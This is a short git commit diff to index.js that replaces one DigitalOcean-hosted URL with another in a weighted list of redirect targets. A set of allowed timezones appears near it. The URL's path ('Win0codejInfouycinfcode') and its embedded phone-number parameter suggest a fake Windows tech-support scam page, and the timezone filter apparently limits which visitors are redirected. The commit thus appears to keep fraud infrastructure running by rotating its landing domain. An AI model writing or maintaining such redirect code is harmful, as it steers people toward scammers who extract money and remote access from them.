cd3dcfb6553332b8030a3df28b70999e1108a594
paalakash <palaksh452@gmail.com>
2026-06-05 11:33:10 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://sea-lion-app-id2zy.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-4991", weight: 1.0 }
+    { url: "https://lionfish-app-kw2pn.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-4991", weight: 1.0 }
 
 ];
 
